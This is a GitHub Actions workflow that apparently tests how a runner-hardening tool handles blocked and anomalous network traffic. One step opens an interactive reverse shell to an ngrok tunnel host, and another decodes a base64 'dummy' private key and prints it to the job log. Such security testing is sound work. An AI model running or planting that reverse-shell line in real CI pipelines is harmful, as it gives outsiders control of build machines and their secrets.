name: Workflow for POCs
on:
  workflow_dispatch:

jobs:
  unauthorized-outbound-call:
    runs-on: ubuntu-latest
    steps:
    - uses: Prateek-stepsecurity/harden-runner@int
      with:
         egress-policy: block
         allowed-endpoints: >
          github.com:443
          goreleaser.com:443
          www.google.com:443
    - name: Checkout code
      uses: actions/checkout@v3
            
    - name: Run outbound calls from host
      run: |
        start_time=$(date +%s)
        end_time=$((start_time + 30))
        
        while [ $(date +%s) -lt $end_time ]; do
          curl -I https://www.google.com
          curl -I https://goreleaser.com
          sleep 10  # wait 10 seconds between calls
        done
    - run: |
          bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1" 

  handle-private-key:
    runs-on: ubuntu-latest
    steps:
    - uses: Prateek-stepsecurity/harden-runner@int
      with:
         egress-policy: audit
    - name: Checkout code
      uses: actions/checkout@v3
    
    - name: Decode and print private key
      env:
        # This is a base64 encoded dummy private key (NOT A REAL KEY)
        # In production, this should be stored in GitHub Secrets
        ENCODED_PRIVATE_KEY: |
          LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tTUlJRXZnSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NCS2d3Z2dTa0FnRUFBb0lCQVFDN1ZKVFV0OVVzOGNLagpNekVmWXlqaVdBNFI0L00yYlMxR0I0dDdOWHA5OEMzU0M2ZFZNdkR1aWN0R2V1clQ4ak5idkpaSHRDU3VZRWNONXI0RQpKV25YaXNLNVkrVHYra1pnWlBtNXdRQTB3MVd1cGZhUlZQUGhoR2dUN1daeEM3UFJMTjIvaUo5dDJRTGloNzlEMFF1ZwpINFE3clB3SVVDdzdOYjJYSVpHc1VYSzJhZmlJM24vT1NQSHVRR0dCRnhIcWI3VWwzM3lJdUN4UjBJcTVuem1RTENFVApSYm5pRzRoeE5aMEo3a3hwZzdtWk5LQ1JKd0NRSFl0SEhxVVVOTGl4Q01TNDU1cWo5SUhJTVYwbEc0NFhLWEV6U0oxWgpjajZuQ1B6aFJtUXBDd2p0MWJJT0NWU0VKMUppU204YTVTdUpLRkxtQWlVTmtsZnJOckdEMjN1RUlRSURBUUFCQW9JQgpBQUh0QmJZcDBBdzVOTi9lV0ROUDVuekZFYVhSWmM3QUNuc3BQN1VFSUZZeDkrNW5BU1pnc0l1ZUh4VlpiZ25QTTl6RQotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0t
      run: |
        echo "Decoding private key..."
        echo "$ENCODED_PRIVATE_KEY" | base64 -d > private_key.pem
        
        echo "Private key content:"
        cat private_key.pem
  anomalous-outbound-call:
    runs-on: ubuntu-latest
    steps:
    - uses: Prateek-stepsecurity/harden-runner@int
      with:
         egress-policy: audit
         
    - name: Checkout code
      uses: actions/checkout@v3
            
    - name: Run outbound calls from host
      run: |
        start_time=$(date +%s)
        end_time=$((start_time + 30))
        
        while [ $(date +%s) -lt $end_time ]; do
          curl -I https://www.google.com
          curl -I https://goreleaser.com
          sleep 10  # wait 10 seconds between calls
        done

    - name: Run anomalous calls
      if: always()
      run: |
          curl bing.com
      #   # Generate a random subdomain
      #   RANDOM_SUBDOMAIN=$(openssl rand -hex 8)
      #   ANOMALOUS_DOMAIN="${RANDOM_SUBDOMAIN}.suppress${RANDOM_SUBDOMAIN}.com"
        
      #   echo "Making anomalous call to: $ANOMALOUS_DOMAIN"
        
      #   # Attempt to connect to the random domain (this will likely fail)
      #   curl -I --max-time 5 "https://$ANOMALOUS_DOMAIN" || true
